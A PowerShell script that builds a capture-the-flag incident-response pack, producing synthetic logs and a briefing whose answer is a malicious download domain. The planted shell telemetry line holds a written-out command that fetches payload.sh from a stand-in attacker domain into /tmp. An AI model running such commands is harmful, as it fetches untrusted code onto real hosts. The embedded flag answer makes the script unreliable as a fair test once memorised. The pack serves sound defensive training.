param()

$ErrorActionPreference = "Stop"

$bundleName = "m5-08-suspicious-download"
$artifactRoot = Join-Path $PSScriptRoot "..\artifacts\m5"
$artifactRoot = [System.IO.Path]::GetFullPath($artifactRoot)
$zipPath = Join-Path $artifactRoot "$bundleName.zip"
$buildRoot = Join-Path $env:TEMP "m5_08_realworld_build"
$bundleRoot = Join-Path $buildRoot $bundleName

function Write-TextFile {
    param([string]$Path, [string]$Content)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllText(
        $Path,
        $Content.Replace("`n", [Environment]::NewLine),
        [System.Text.Encoding]::UTF8
    )
}

function Write-LinesFile {
    param([string]$Path, [System.Collections.Generic.List[string]]$Lines)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllLines($Path, $Lines, [System.Text.Encoding]::UTF8)
}

function New-ShellCommandTelemetry {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,node,user,tty,command,exit_code,context")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $commands = @(
        "ls -la /var/www",
        "sudo systemctl status nginx",
        "journalctl -u ssh --since '30 min ago'",
        "cat /etc/resolv.conf",
        "python3 /opt/tools/health_check.py",
        "find /tmp -type f -mtime +2 -delete",
        "crontab -l",
        "ss -tulpen"
    )

    for ($i = 0; $i -lt 7800; $i++) {
        $ts = $base.AddSeconds($i * 8).ToString("o")
        $node = "lin-dl-{0:D2}" -f (1 + ($i % 5))
        $acct = if (($i % 7) -eq 0) { "deploy" } else { "opsadmin" }
        $tty = "pts/$($i % 4)"
        $cmd = $commands[$i % $commands.Count]
        $exit = if (($i % 173) -eq 0) { 1 } else { 0 }
        $lines.Add("$ts,$node,$acct,$tty,""$cmd"",$exit,routine")
    }

    $lines.Add("2026-03-08T07:08:11Z,lin-dl-02,deploy,pts/1,""wget http://bad-domain.ru/payload.sh -O /tmp/payload.sh"",0,suspicious_download")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-WgetExecutionLog {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 6400; $i++) {
        $ts = $base.AddSeconds($i * 9).ToString("yyyy-MM-ddTHH:mm:ssZ")
        $addr = "203.0.113.$((20 + $i) % 220)"
        $path = "/repo/script_{0:D4}.sh" -f ($i % 8000)
        $node = "lin-dl-{0:D2}" -f (1 + ($i % 5))
        $lines.Add("$ts wget node=$node user=deploy url=http://$addr$path status=200 bytes=$((1200 + ($i % 90000)))")
    }

    $lines.Add("2026-03-08T07:08:11Z wget node=lin-dl-02 user=deploy url=http://bad-domain.ru/payload.sh status=200 bytes=44128")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-DnsLog {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $domains = @("security.ubuntu.com","pypi.org","api.github.com","archive.ubuntu.com","repo.mysql.com")

    for ($i = 0; $i -lt 6200; $i++) {
        $ts = $base.AddSeconds($i * 10).ToString("yyyy-MM-ddTHH:mm:ssZ")
        $src = "10.70.$((10 + $i) % 220).$((20 + $i) % 220)"
        $q = $domains[$i % $domains.Count]
        $rcode = if (($i % 197) -eq 0) { "SERVFAIL" } else { "NOERROR" }
        $lines.Add("$ts dns node=resolver-01 src_ip=$src qname=$q qtype=A rcode=$rcode")
    }

    $lines.Add("2026-03-08T07:08:10Z dns node=resolver-01 src_ip=10.70.44.11 qname=bad-domain.ru qtype=A rcode=NOERROR")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-ProxyLog {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 6100; $i++) {
        $ts = $base.AddSeconds($i * 10).ToString("o")
        $dom = if (($i % 2) -eq 0) { "github.com" } else { "packages.ubuntu.com" }
        $uri = if ($dom -eq "github.com") { "/org/repo/$((100 + $i) % 9999)" } else { "/ubuntu/pool/main/$((100 + $i) % 999)" }
        $node = "lin-dl-{0:D2}" -f (1 + ($i % 5))
        $lines.Add("$ts host=$node method=GET domain=$dom uri=$uri status=200 bytes=$((800 + ($i % 17000)))")
    }

    $lines.Add("2026-03-08T07:08:11Z host=lin-dl-02 method=GET domain=bad-domain.ru uri=/payload.sh status=200 bytes=44128")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-FileWriteAudit {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 5300; $i++) {
        $ts = $base.AddSeconds($i * 11).ToString("yyyy-MM-ddTHH:mm:ssZ")
        $acct = if (($i % 4) -eq 0) { "deploy" } else { "appsvc" }
        $path = if (($i % 3) -eq 0) { "/tmp/cache_$("{0:D5}" -f $i).tmp" } else { "/var/tmp/work_$("{0:D4}" -f $i).log" }
        $lines.Add("$ts auditd type=PATH node=lin-dl-02 user=$acct op=WRITE path=$path size=$((300 + ($i % 120000)))")
    }

    $lines.Add("2026-03-08T07:08:12Z auditd type=PATH node=lin-dl-02 user=deploy op=WRITE path=/tmp/payload.sh size=44128")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-DownloadAlerts {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $types = @("download_baseline_watch","new_domain_access","script_download_watch","shell_command_watch")

    for ($i = 0; $i -lt 4300; $i++) {
        $entry = [ordered]@{
            timestamp_utc = $base.AddSeconds($i * 11).ToString("o")
            alert_id = "dl-" + ("{0:D8}" -f (95000000 + $i))
            severity = if (($i % 179) -eq 0) { "medium" } else { "low" }
            type = $types[$i % $types.Count]
            status = "closed_noise"
            detail = "routine network transfer telemetry"
        }
        $lines.Add(($entry | ConvertTo-Json -Compress))
    }

    $lines.Add((([ordered]@{
        timestamp_utc = "2026-03-08T07:08:11Z"
        alert_id = "dl-99977188"
        severity = "critical"
        type = "suspicious_script_download"
        status = "open"
        detail = "script downloaded from untrusted domain via shell command"
        suspicious_domain = "bad-domain.ru"
        node = "lin-dl-02"
    }) | ConvertTo-Json -Compress))
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-SiemTimeline {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,event_type,system,severity,details")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 5100; $i++) {
        $ts = $base.AddSeconds($i * 9).ToString("o")
        $evt = if (($i % 263) -eq 0) { "download_review" } else { "routine_transfer_monitoring" }
        $sev = if ($evt -eq "download_review") { "medium" } else { "low" }
        $lines.Add("$ts,$evt,siem-download-01,$sev,file download telemetry baseline")
    }

    $lines.Add("2026-03-08T07:08:11Z,untrusted_domain_download,siem-download-01,critical,wget pulled payload from bad-domain.ru")
    $lines.Add("2026-03-08T07:08:12Z,payload_written_to_tmp,siem-download-01,high,/tmp/payload.sh written after external fetch")
    $lines.Add("2026-03-08T07:08:19Z,incident_opened,siem-download-01,high,INC-2026-5508 suspicious download investigation")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-Policy {
    param([string]$OutputPath)

    $content = @'
Remote Script Download Policy (Excerpt)

1) Shell-based downloads from untrusted domains are prohibited.
2) Domain IOC must be extracted during suspicious download triage.
3) Downloads of executable scripts to /tmp require immediate escalation.
'@
    Write-TextFile -Path $OutputPath -Content $content
}

function New-Runbook {
    param([string]$OutputPath)

    $content = @'
Suspicious Download Triage Runbook (Excerpt)

1) Correlate shell command telemetry with wget/proxy logs.
2) Validate domain through DNS resolution and network records.
3) Confirm local payload write path and classify risk.
4) Report malicious domain IOC and isolate affected host.
'@
    Write-TextFile -Path $OutputPath -Content $content
}

Remove-Item -Recurse -Force $buildRoot -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path (Join-Path $bundleRoot "evidence") | Out-Null

$description = @'
Challenge: M5-08 Suspicious Download (Real-World Investigation Pack)

Scenario:
SOC observed a shell-driven script download from a potentially malicious external source.

Task:
Analyze the investigation pack and identify the malicious domain used for the download.

Flag format:
CTF{answer}
'@
Write-TextFile -Path (Join-Path $bundleRoot "description.txt") -Content $description

$ticket = @'
Incident: INC-2026-5508
Severity: High
Queue: SOC + Linux Ops + Threat Hunting

Summary:
A production node executed a suspicious download command and wrote script content into /tmp.

Scope:
- Node: lin-dl-02
- Window: 2026-03-08 07:08 UTC
- Goal: identify malicious domain IOC
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\incident_ticket.txt") -Content $ticket

$handoff = @'
Analyst handoff:
- Correlate shell command telemetry, wget execution logs, DNS/proxy evidence, file write audit, security alerts, SIEM timeline, and policy/runbook guidance.
- Determine the malicious domain used for the suspicious download.
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\analyst_handoff.txt") -Content $handoff

New-ShellCommandTelemetry -OutputPath (Join-Path $bundleRoot "evidence\host\shell_command_telemetry.csv")
New-WgetExecutionLog -OutputPath (Join-Path $bundleRoot "evidence\network\wget_execution.log")
New-DnsLog -OutputPath (Join-Path $bundleRoot "evidence\network\dns_query.log")
New-ProxyLog -OutputPath (Join-Path $bundleRoot "evidence\network\proxy_egress.log")
New-FileWriteAudit -OutputPath (Join-Path $bundleRoot "evidence\host\file_write_audit.log")
New-DownloadAlerts -OutputPath (Join-Path $bundleRoot "evidence\security\download_alerts.jsonl")
New-SiemTimeline -OutputPath (Join-Path $bundleRoot "evidence\siem\timeline_events.csv")
New-Policy -OutputPath (Join-Path $bundleRoot "evidence\policy\remote_script_download_policy.txt")
New-Runbook -OutputPath (Join-Path $bundleRoot "evidence\policy\suspicious_download_triage_runbook.txt")

New-Item -ItemType Directory -Force -Path $artifactRoot | Out-Null
if (Test-Path $zipPath) {
    Remove-Item -Force $zipPath
}
Compress-Archive -Path (Join-Path $bundleRoot "*") -DestinationPath $zipPath -Force
Remove-Item -Recurse -Force $buildRoot

Get-Item $zipPath | Select-Object FullName, Length, LastWriteTime
